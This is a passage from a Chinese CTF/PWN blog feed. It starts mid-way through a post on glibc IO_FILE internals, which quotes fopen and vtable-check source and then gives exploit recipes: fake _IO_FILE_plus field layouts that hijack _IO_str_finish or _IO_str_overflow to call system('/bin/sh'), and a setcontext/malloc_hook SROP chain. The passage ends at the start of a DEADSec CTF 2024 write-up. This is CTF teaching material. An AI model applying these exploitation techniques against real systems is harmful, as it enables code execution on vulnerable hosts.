orientation,</span><br><span class="line">     <span class="keyword">struct</span> _IO_wide_data *wd, <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *jmp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_old_init (fp, flags);</span><br><span class="line">  fp-&gt;_mode = orientation;</span><br><span class="line">  <span class="keyword">if</span> (orientation &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data = wd;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Cause predictable crash when a wide function is called on a byte</span></span><br><span class="line"><span class="comment">       stream.  */</span></span><br><span class="line">    fp-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) <span class="number">-1L</span>;</span><br><span class="line">  fp-&gt;_freeres_list = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS(THIS) (THIS)-&gt;vtable</span></span><br></pre></td></tr></table></figure><p>然后初始化FILE结构本身，将新的FILE链入链表中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_init_internal (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment">     position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      fp-&gt;file._chain = (FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      FILE **f;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">_IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line"><span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">  <span class="keyword">if</span> (*f == (FILE *) fp)</span><br><span class="line">    &#123;</span><br><span class="line">      *f = fp-&gt;file._chain;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后调用系统调用打开文件，就算完成了一次fopen。</p><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>每一个FILE结构中的vtable指针指向同一个位置，通常会将<code>_IO_overflow_t</code>改为system(参数写在flags位上)或onegadget地址完成利用。</p><h5 id="IO-flush-all-lockp"><a href="#IO-flush-all-lockp" class="headerlink" title="_IO_flush_all_lockp"></a>_IO_flush_all_lockp</h5><p>调用<code>_IO_flush_all_lockp</code>时，这个函数会刷新<code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用<code>_IO_FILE_plus.vtable</code> 中的_IO_overflow。</p><p>我们重点关注这个函数及相关调用是因为攻击者常常利用这个函数来进行一系列的攻击操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p><ol><li>当 libc 执行 abort 流程时（2.26开始被删除）</li><li>当执行 exit 函数时</li><li>当执行流从 main 函数返回时</li></ol><p>且为了使<code>_IO_flush_all_lockp</code>能正常工作，我们要满足调用<code>_IO_OVERFLOW</code>的其他条件，即</p><ul><li>fp-&gt;_mode &lt;&#x3D; 0</li><li>fp-&gt;<code>_IO_write_ptr</code> &gt; fp-&gt;<code>_IO_write_base</code></li></ul><p>由此构造<code>_IO_FILE_plus</code>和vtable的<code>_IO_OVERFLOW</code>（位于0x18偏移处）</p><h5 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h5><p>2.23版本中对vtable没有检查，可以在可控地址上伪造虚表后，再劫持原本的vtable指针为伪造的虚表。</p><h5 id="2-24"><a href="#2-24" class="headerlink" title="2.24"></a>2.24</h5><p>2.24中新增了对vtable指针的检测，检查该地址是否合法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IO_validate_vtable (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="type">void</span> (*flag) (<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (!rtld_active ()</span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其首先检查vtable是否在libc的数据段上，如果不在，则检查其是否在ld等其他模块的合法位置，若否则报错。然而这个检查跳过了<code>_IO_str_jumps</code>和<code>IO_wstr_jumps</code>这两个与原本vtable结构相同的虚表，则我们可以通过劫持这两个虚表，再修改vtable指针即能绕过检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一般有两个利用链：</p><ol><li>_IO_str_jumps -&gt; _IO_str_finish</li><li>_IO_str_jumps -&gt; _IO_str_overflow</li></ol><h5 id="IO-str-finish"><a href="#IO-str-finish" class="headerlink" title="_IO_str_finish"></a>_IO_str_finish</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _IO_str_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; <span class="number">1</span>))</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))fp + <span class="number">0xE8</span> ) (fp-&gt;_IO_buf_base); <span class="comment">// call qword ptr [fp+E8h]</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个函数以<code>fp-&gt;_IO_buf_base</code>为参数执行了<code>fp+0xE8</code>处的函数。</p><p>需要满足:</p><ol><li>fp-&gt;_IO_buf_base !&#x3D; 0</li><li>fp-&gt;_flags为偶数</li></ol><p>这条链是exit来触发的，所以还需要满足_IO_flush_all_lockp的检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_IO_write_ptr &gt; fp-&gt; _IO_write_base</span><br><span class="line">fp-&gt; _mode &lt;= <span class="number">0</span></span><br></pre></td></tr></table></figure><p>所以要构造：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flag = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr = <span class="number">1</span></span><br><span class="line">fp-&gt;_IO_buf_base = str_binsh_addr</span><br><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">fp+<span class="number">0xE8</span> = system_addr</span><br></pre></td></tr></table></figure><p>然后将目标文件流的vtable指向_IO_str_jumps-0x8来调用 _IO_str_finish（因为原本要调用的是 _IO_str_overflow，减去0x8即可指向 _IO_str_finish）</p><h5 id="IO-str-overflow"><a href="#IO-str-overflow" class="headerlink" title="_IO_str_overflow"></a>_IO_str_overflow</h5><p>这个函数比较复杂，不分析了，直接套用其他师傅的结论：以</p><p><code>2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100</code>为参数调用<code>fp+0xE0</code>处的函数。绕过条件需要满足：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags &amp; <span class="number">8</span> == <span class="number">0</span>, (fp-&gt; _flags &amp; <span class="number">0xC00</span>) == <span class="number">0x400</span>, fp-&gt; _flags &amp; <span class="number">1</span> = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt; fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</span><br></pre></td></tr></table></figure><p>所以我们需要构造</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0</span></span><br><span class="line">_IO_write_base = <span class="number">0</span></span><br><span class="line">_IO_write_ptr = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> +<span class="number">1</span></span><br><span class="line">_IO_buf_base = <span class="number">0</span></span><br><span class="line">_IO_buf_end = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> </span><br><span class="line"></span><br><span class="line">_mode = <span class="number">-1</span></span><br><span class="line">fp+<span class="number">0xE0</span> = system_addr</span><br><span class="line">vtable = _IO_str_jumps - <span class="number">0x18</span></span><br></pre></td></tr></table></figure><h5 id="2-28"><a href="#2-28" class="headerlink" title="2.28"></a>2.28</h5><p>2.28版本之后上面两个利用链的函数指针被改为free，无法劫持其为system或ogg去实行攻击。2.35的代码为例对比观察一下就能发现问题了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从此往后的利用需要用到setcontext（2.29-2.31）和house of apple（2.31-2.39）。</p><p>这里先post一个师傅对setcontext的讲解，后面我在慢慢研究。</p><p>结合2.29版本后setcontex函数变化，观察汇编代码，_IO_str_overflow出现一些有趣的利用方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7e6eb4f &lt;__GI__IO_str_overflow+47&gt;:je     0x7ffff7e6ec80 &lt;__GI__IO_str_overflow+352&gt;</span><br><span class="line">0x7ffff7e6eb55 &lt;__GI__IO_str_overflow+53&gt;:mov    rdx,QWORD PTR [rdi+0x28]  &lt;----</span><br><span class="line">0x7ffff7e6eb59 &lt;__GI__IO_str_overflow+57&gt;:mov    r14,QWORD PTR [rbx+0x38]</span><br><span class="line">0x7ffff7e6eb5d &lt;__GI__IO_str_overflow+61&gt;:mov    r12,QWORD PTR [rbx+0x40]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在调用malloc之前，有一条指令讲rdi+0x28的值赋给了rdx，由于此时rdi指向IO_FILE_plus的头部，所以rdx的值为_IO_write_ptr</p><p>而在glibc2.29的版本上setcontext的利用从以前的rdi变为了rdx，因此攻击者可以通过这个位置来进行新版下的setcontext,进而实现<strong>srop</strong></p><p>步骤为</p><ol><li>控制malloc_hook为setcontext函数</li><li>进入io_str_overflow时首先将rdx赋值为填充了context的地址（此时同时满足了<code>fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base</code>）</li><li>调用malloc触发malloc_hook中函数，控制程序执行</li></ol>]]></content>
    
    
    <summary type="html">glibc2.35，有特殊情况会说明。</summary>
    
    
    
    <category term="glibc源码补完计划" scheme="https://c-lby.top/categories/glibc%E6%BA%90%E7%A0%81%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="IO_FILE" scheme="https://c-lby.top/tags/IO-FILE/"/>
    
  </entry>
  
  <entry>
    <title>『DEADSec CTF 2024』 PWN WP</title>
    <link href="https://c-lby.top/2024/07/30/2024-deadsec-wp/"/>
    <id>https://c-lby.top/2024/07/30/2024-deadsec-wp/</id>
    <published>2024-07-29T16:23:43.000Z</published>
    <updated>2024-08-07T15:08:40.675Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-Super-CPP-Calc"><a href="#0x01-Super-CPP-Calc" class="headerlink" title="0x01 Super CPP Calc"></a>0x01 Super CPP Calc</h3><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">28</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  Calculator::Calculator((Calculator *)v3);</span><br><span class="line">  setup();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      banner();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">1337</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      Calculator::Backdoor((Calculator *)v3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt;= <span class="number">1337</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        Calculator::setnumber_floater((Calculator *)v3);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        Calculator::setnumber_integer((Calculator *)v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序应该是初始化了一个Calculator类，其中包含三个成员函数，并对成员变量进行了初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 